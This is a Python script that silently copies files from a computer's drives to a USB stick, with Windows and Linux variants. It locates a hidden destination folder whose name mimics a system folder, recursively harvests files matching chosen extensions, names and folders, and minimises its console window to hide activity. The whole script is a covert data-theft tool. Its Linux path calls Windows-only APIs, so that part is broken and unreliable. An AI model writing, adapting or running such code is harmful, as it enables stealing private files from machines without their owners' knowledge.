from platform import system as syst
from shutil import copyfile, copytree
from time import localtime
from sys import stdout
from time import sleep
from os import walk, chdir, listdir, sep, path, makedirs

class MainWindows:
    def __init__(self):
        filess = listdir('.')
        if "types.txt" in filess :
            file = open('types.txt')
            reader = file.readlines()
            listertype = reader[0].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("type=", "").lower().split(",")
            listerfile = reader[1].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("file=", "").lower().split(",")
            listerfolder = reader[2].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("folder=","").lower().split(",")
            reader[3] = reader[3].replace(" ", "").replace("\n", "").lower().replace("search_OS_drive=", "")

            listertypes = []
            x = 0
            while x < len(listertype):
                if listertype[x] != "\n":
                    listertypes.append("." + listertype[x].replace("\n", ""))
                x += 1

            listerfiles = []
            y = 0
            while y < len(listerfile):
                if listerfile[y] != "\n":
                    listerfiles.append(listerfile[y].replace("\n", ""))
                y += 1

            listerfolders = []
            z  = 0
            while z < len(listerfolder):
                if listerfolder[z] != "\n":
                    listerfolders.append(listerfolder[z].replace("\n", ""))
                z += 1

            self.folders = list(filter(None, listerfolders))
            self.types = list(filter(None, listertypes))
            self.file = list(filter(None, listerfiles))

            self.oser = "NO-os"
            if reader[3] == "yes":
                self.oser = "Yes-os"
                admin = ctypes.windll.shell32.IsUserAnAdmin()
                if admin != 1 :
                    print("May not work without Admin Permission")
        else:
            print("no *type.txt* file !!!")

    def usb_finder(self):
        self.usb_list = []
        self.dest = ""
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.usb_list.append(drname)

        if self.usb_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

        favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}"

        for usb in self.usb_list:

            chdir(usb)
            if favorite in listdir('.'):
                self.dest = usb + "\\" + favorite + "\\"
        if self.dest == "":
            print("No F-USB!!!")
            sleep(4)
            exit()

    def drives(self):
        win = environ['SYSTEMDRIVE'] + "\\"

        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_FIXED:
                    self.drive_list.append(drname)

## region OS:
        if self.oser == "NO-os":
            for i in self.drive_list:
                if i == win :
                    self.drive_list.remove(i)
## endregion
        self.counter = 0
        for driver in self.drive_list:
            self.copier(driver)

    def copier(self,driver):
            #region AutoMinimize
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
            #endregion
            chdir(driver)

            files = self.file
            types = self.types
            folder = self.folders

            for (dirpath, dirname, filenames) in walk('.'):
                if types != []:
                    for filename in filenames:
                        for type in types:
                            if filename.lower().endswith(types[types.index(type)]):
                                main_location = sep.join([dirpath,filename])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":","")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if filename in listdir(self.dest):
                                    filename = filename.replace(types[types.index(type)],"")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath+ filename + time +types[types.index(type)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r'+str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest +absulpath+ filename)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' +str(self.counter))

                if files != [] :
                    for filename in filenames :
                        for file in files:
                            if files[files.index(file)] in filename.lower():
                                main_location = sep.join([dirpath, filename])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":", "")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if filename in listdir(self.dest):
                                    filename = filename.replace(files[files.index(file)], "")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location,self.dest + absulpath + filename + time + files[files.index(file)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath + filename)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                if folder != [] :
                    for dir in dirname :
                        for fold in folder :
                            if folder[folder.index(fold)] in dir.lower():
                                main_location = sep.join([dirpath, dir])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":", "")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if dir in listdir(self.dest):
                                    dir = dir.replace(folder[folder.index(fold)], "")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location, self.dest + absulpath + dir)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))


class MainLinux:
    def __init__(self):
        self.username = getuser()

        filess = listdir('.')
        # print(filess)

        if "types.txt" in filess:
            file = open('types.txt')
            reader = file.readlines()
            listertype = reader[0].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("type=", "").lower().split(",")
            listerfile = reader[1].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("file=", "").lower().split(",")
            listerfolder = reader[2].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("folder=", "").lower().split(",")
            reader[3] = reader[3].replace(" ","").replace("\n","").lower().replace("search_OS_drive=","")

            listertypes = []
            x = 0
            while x < len(listertype):
                if listertype[x] != "\n":
                    listertypes.append("." + listertype[x].replace("\n", ""))
                x += 1

            listerfiles = []
            y = 0
            while y < len(listerfile):
                if listerfile[y] != "\n":
                    listerfiles.append(listerfile[y].replace("\n", ""))
                y += 1

            listerfolders = []
            z  = 0
            while z < len(listerfolder):
                if listerfolder[z] != "\n":
                    listerfolders.append(listerfolder[z].replace("\n", ""))
                z += 1

            self.folders = list(filter(None, listerfolders))
            self.types = list(filter(None, listertypes))
            self.file = list(filter(None, listerfiles))


            self.oser = "NO-os"
            if reader[3] == "yes":
                self.oser = "Yes-os"
                if getuid() != 0:
                    print("Run the srcipt with root user , or change "+ '\033[1m' + "search_OS_drive " + "in types.txt to" + "\033[1m"+ " yes")
                    sleep(4)
                    exit()
                else:
                    self.username = input("enter your non-root username: ").lower()

            self.usb_finder()
        else:
            print("no *type.txt* file !!!")

    def usb_finder(self):
        chdir("/media/" + self.username + "/")
        self.usb_list = listdir('.')

        if self.usb_list.__len__() == 0:
            print("No USB Connected!!!")
            sleep(4)
            exit()

        favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}"

        for usb in self.usb_list:
            chdir(usb)
            if favorite in listdir('.'):
                self.dest = "/media/" + self.username + sep + usb + sep + favorite + sep
        # print(self.dest)
        if self.dest == "":
            print("No F-USB!!!")
            sleep(4)
            exit()
        else:
            self.drives()

    def drives(self):
        self.drive_list = ["/"]

## region NOT OS:
        if self.oser == "NO-os":
            self.drive_list = ["/media","/home","/mnt"]
## endregion

        self.counter = 0
        for driver in self.drive_list:
            if driver != "/" :
                if driver.replace(sep,"") in listdir("/"):
                    self.copier(driver)
            else:
                self.copier(driver)

    def copier(self,driver):
            #region AutoMinimize
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
            #endregion
            self.counter = 0
            chdir(driver)

            files = self.file
            types = self.types
            folder = self.folders
            # print(files,types,folder)
            # destination = "D:\\MY Projects"

            for (dirpath, dirname, filenames) in walk('.'):
                if types != []:
                    for filename in filenames:
                        for type in types:
                            if filename.lower().endswith(types[types.index(type)]):
                                main_location = sep.join([dirpath,filename])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":","")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if filename in listdir(self.dest):
                                    filename = filename.replace(types[types.index(type)],"")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath+ filename + time +types[types.index(type)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r'+str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest +absulpath+ filename)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' +str(self.counter))

                if files != [] :
                    for filename in filenames :
                        for file in files:
                            if files[files.index(file)] in filename.lower():
                                main_location = sep.join([dirpath, filename])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":", "")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if filename in listdir(self.dest):
                                    filename = filename.replace(files[files.index(file)], "")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location,self.dest + absulpath + filename + time + files[files.index(file)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath + filename)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                if folder != [] :
                    for dir in dirname :
                        for fold in folder :
                            if folder[folder.index(fold)] in dir.lower():
                                main_location = sep.join([dirpath, dir])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":", "")
                                absulpath = absulpath[:absulpath.rfind(sep)] + sep
                                # print(absulpath)

                                if dir in listdir(self.dest):
                                    dir = dir.replace(folder[folder.index(fold)], "")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location, self.dest + absulpath + dir)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))



if __name__ == "__main__":
    if syst() == "Windows":
        from os import environ
        import ctypes
        from win32api import GetLogicalDrives
        from win32file import GetDriveType, DRIVE_FIXED, DRIVE_REMOVABLE
        M = MainWindows()
        M.usb_finder()
        M.drives()
        print(".")
    if syst() == "Linux":
        from getpass import getuser
        from os import getuid
        M = MainLinux()
        print(".")
